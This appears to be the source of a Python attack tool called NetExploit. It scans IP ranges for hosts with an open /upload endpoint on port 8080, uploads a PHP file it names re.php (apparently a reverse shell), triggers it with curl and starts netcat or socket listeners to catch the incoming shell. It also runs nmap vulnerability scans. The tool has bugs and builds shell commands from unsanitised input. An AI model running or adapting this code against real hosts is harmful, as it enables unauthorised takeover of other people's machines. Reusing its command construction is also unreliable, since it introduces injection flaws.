#!/usr/bin/python3

version = "testing"

import os
import sys
import time
from typing import Collection
import requests
import nmap
import json
import urllib3
import urllib
import threading
import base64
import hashlib
import socket
from art import *
from termcolor import colored
sys.path.append('__init__')
import file_creator as file
import get_ip as ad
SEC_PATH = "/usr/bin/"
nm = nmap.PortScanner()

def nc(ops):
    port2 = 4444
    print(colored("[*] starting code injection for " + ops , "blue"))
    print(colored("[!] You have only 3s before the reverse shell try to connect", "yellow"))
    #port2 = input(colored("[*] Enter the port to listen on with netcat: ", "blue"))
    os.system('gnome-terminal -- bash -c "nc -lvvp '+str(port2)+'" & ')

def listen(port):
    n = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if n == 0:
            print(colored("[+] Listening on port %s" % port, "green"))
        s.bind(('', port))
        s.listen(10)
        conn, addr = s.accept()
        if n == 0:
                
                print(colored("[+] Connection from %s" % addr[0], "green"))
        
        while True:

            
            
            
            
            ops = "0" 
                
            data = conn.recv(2048)
            if not data:   
                break
            n = n +1     
            if data.decode() == "99":
                print(colored("|_|", "red"))
                conn.send("99".encode())
                
                print(colored("[-] Connection closed", "red"))
            if data.decode() == "84":
                print(colored("[+] Connection established", "green"))
                
            if data.decode() == "01":
                ops = "Linux"
                print(colored("[+] target OS is Linux", "green"))
            if data.decode() == "02":
                ops = 'Windows'
                print(colored("[+] target OS is Windows ", "green"))
            if data.decode() == "03":
                ops = 'OSX'
                print(colored("[+] target OS is OSX"))
            
                
            if (data.decode() == 10) and (ops == 'Linux'):
                print("...")
            if data.decode() == '400':
                print(colored("[-] this OS is not compatible yet!!!", "red"))
                main()                
            if data.decode() == "401":
                print(colored("[-] an error unknow as occured", "red"))
            if data.decode() == "405":
                print(colored("[-] an error as occured while downloading", "red"))
            if data.decode() == "46":
                x = threading.Thread(target=nc(ops), args=(1,))
                x.start()
                x.join()
            if data.decode() == "00":
                print(colored(text2art("PWNED", "cyan")))
                time.sleep(2)
                print(colored("You have pwned "+addr[0]+" on "+ ops+" with Netexploit", "green"))
#            print(data.decode())


  

    except Exception as e:
        print(e)
        time.sleep(1)
        main()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text

def banner():
    print(colored(text2art("NetExploit"), "red"))
    print(colored("[+] Author: Guidenevada", "green"))


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def uploader(ip_range):
    
    urllib3.disable_warnings()
    
    
    ip_list = scan_network(ip_range)
    fast = 0.5
    slow = 3
    speed = input(colored("[*] The slow scan can take 13 minutes and the fast one can take 3 minutes\n[+] Speed (fast/slow): ", "blue"))
    if speed == "fast":
        timeo = fast
    elif speed == "slow":
        timeo = slow
    else:
        print(colored("[-] Invalid speed", 'red'))
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print(colored("[*] Testing %s" % url, "blue"))
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                path_dir ="report/" + ip
                file.create_dir(path_dir)
                print(colored("[+] %s is vulnerable" % url, "green"))
                filename = "re.php"
                print(colored("[+] File size: %s" % get_file_size(filename), "green"))
                print(colored("[+] File md5: %s" % get_file_md5(filename), "green"))
                upload_file(url, filename)
                print(colored("[+] File %s uploaded" % filename, "green"))
                port = int(4443)
                print(colored("[+] Listening on port %s" % port, "green"))
                os.system("gnome-terminal --bash -c 'curl "+ url+"/re.php'")
                listener = input(colored("[*] Do you want to start a listener? [y/n]: ", "blue"))
                if (listener == "y") or (listener == "Y"):
                    try:
                        listen(port)
                    except KeyboardInterrupt:
                        print(colored("\n[-] Listening stoped...","red"))
                        pass
                else:
                    pass
                
      
        
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            exit(1)
        except Exception as e:
            print(colored("[-] Unknown error", 'red'))
            print(e)

def scanner():
    url = input(colored("[*] Enter target URL: ", "blue"))
    ip = ad.get(url)
    path_dir =str("report/" + ip)

    if ip == "error":
        print(colored("[-] Invalid URL or host DOWN", "red"))
        main()
    file.create_dir(path_dir)
    pp = ""
    print(colored("[+] Target IP: %s" % ip, "green"))
    print(colored("[+] Target URL: %s" % url, "green"))
    print(colored("[*] Scanning ports of %s" % url, "blue"))
    
    for port in [21, 22, 23, 25, 53, 55, 80, 110, 443, 444, 445, 3306, 5555, 8080, 8443, 9080, 9090, 9999, 10000, 10001]:
        
        nm.scan(ip, str(port), arguments=" -sC -sV ")
        if nm[ip]['tcp'][port]['state'] == "open":
            print(colored("[+] % i is open" % port, "green"))
            pp = pp + " " + str(port)
    print(colored("[+] Port scanning finished", "green"))
    os.system("echo '" + pp +"' > " + path_dir + ip +".txt" )
    print(colored("[*] Scanning for vulnerabilities %s" % url, "blue"))
    result = nm.scan(hosts=str(ip), arguments='-A    --script=vuln')
    
    xml = nm.get_nmap_last_output()
    resultcsv = nm.csv()
    #printable = nm.scan('nmap -sV -oX ' + path_dir + '/nmap.xml  --script vuln,safe  ' + ip)
    resultb64 = base64.b64encode(str(result).encode('utf-8'))
    resultb64 = str(resultb64)
    resultb64 = resultb64.replace('b\'', '')
    resultb64 = resultb64.replace("'", '')
    print(colored("[+] Scan completed", "green"))
    clear = json.dumps(result)
    #print(resultb64)
    resjson = str(path_dir + "/nmap.json")
    rescsv = str(path_dir + "/nmap.csv")
    resxml = str(path_dir + "/nmap.xml")
    #open(resjson, 'w').write(result)

    print(colored("[+] scan results :\n " + ip + "\n" ,"green"))
    print('----------------------------------------------------')
#    print(colored(nm[ip].state(), "green"))
#    print(colored(nm[ip].hostname(), "green"))
#    print(colored(nm[ip].all_tcp(), "green"))
#    print(colored(nm[ip].all_udp(), "green"))
#    print(colored(nm[ip].all_protocols(), "green"))
#
#
#    print(colored(nm[ip].all_sctp(), "green"))
#    print(colored(nm.all_hosts(), "green"))
#    print(colored(nm.all_hosts().keys(), "green"))
#    print(colored(nm.all_hosts().values(), "green"))
#    print(colored(nm.all_hosts().items(), "green"))

    print(colored("[+] %s is up" % ip, "green"))
    print(colored("[+] Hostname: %s" % nm[ip].hostname(), "green"))

    
    #print(nm.scaninfo())
    for proto in nm[ip].all_protocols():
        lport = nm[ip][proto].keys()

        for port in lport:
            print(colored('[+] port : %s\tstate : %s' % (port, nm[ip][proto][port]['state']),"green"))
        print(colored("[+] Protocol: %s" % proto, "green"))
        #print(colored("[+] %s" % nm[ip][proto].keys(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].values(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].items(), "green"))

    #print(nm.scanstats())
    #print(nm.command_line())
    #print(nm.all_hosts())
  

    print('----------------------------------------------------')
     
    
    
    
    
    open(rescsv , 'w').write(str(resultcsv))
    open(resxml , 'w').write(xml.decode())
    print(colored("[+] Nmap scan saved in %s/" % path_dir, "green"))
    #print(open(path_dir + '/nmap.csv').read())
    exit()   

def netdiscover(ip_range):

    
    if ip_range[len(ip_range)-1] == ".":
       
        ip_range2 = ip_range 
    else: 
        
        ip_range2 = ip_range + "."
    file.create_dir("report/"+ ip_range2)
    for i in range (1, 255):
        ip = ip_range2 + str(i)
        nm.scan(ip, arguments="-sP")
        try:
            nm[ip].has_ip
            print(colored("[+] %s is up" % ip, "green"))
    
            

            os.system("echo '" + ip + " '>> report/"+ip_range2 +"/ip.txt")
        except:
            #print(colored(ip + "----------------------------- down" , "red"))
            pass
def messbyver(version):
    if version == "testing":
        print(colored("[!] netexploit is in testing version.", "yellow"))
        print(colored("[!] Please, report bugs to issue section.", "yellow"))
    if version == "release":
        pass
    if version == "beta":
        print(colored("[!] you are running on beta version, you might see some minor bug", "yellow"))
    else:
        print(colored("[!] You are running on a unknow version, please, if you see any issue, please download this original via github", "red"))
def main():
    try:
 
        #print(colored("[+] NetExploit", "red"))
        #print(colored("[+] Author: Guidenevada", "green"))
        messbyver(version)
        choice = int(input(colored("\n1 -webscan\n2 -autouploader\n3 -netdiscover(alpha version)\n4- listener\n\n[*] Choose an option: ", "blue")))
        if choice == 1:

            scanner()
        if choice == 2:
            ip_range = str(input(colored("[*] Enter IP range: ", "blue")))

            uploader(ip_range)
        if choice == 3:
            ip_range = str(input(colored("[*] Enter IP range: ", "blue")))

            netdiscover(ip_range)
        if choice == 4:
            port = input(colored("[*] Enter the port to listen on with the injector: ", "blue"))
            port = int(port)
            listen(port)
            
        else:
            print(colored("[-] Invalid option", "red"))
            main()
    except ValueError:
        print(colored("[-] Invalid option", "red"))
        main()
if __name__ == "__main__":
    try:
        banner()
        main()
    except KeyboardInterrupt:
        print(colored("[-] User Interrupt", "red"))
        exit(1)
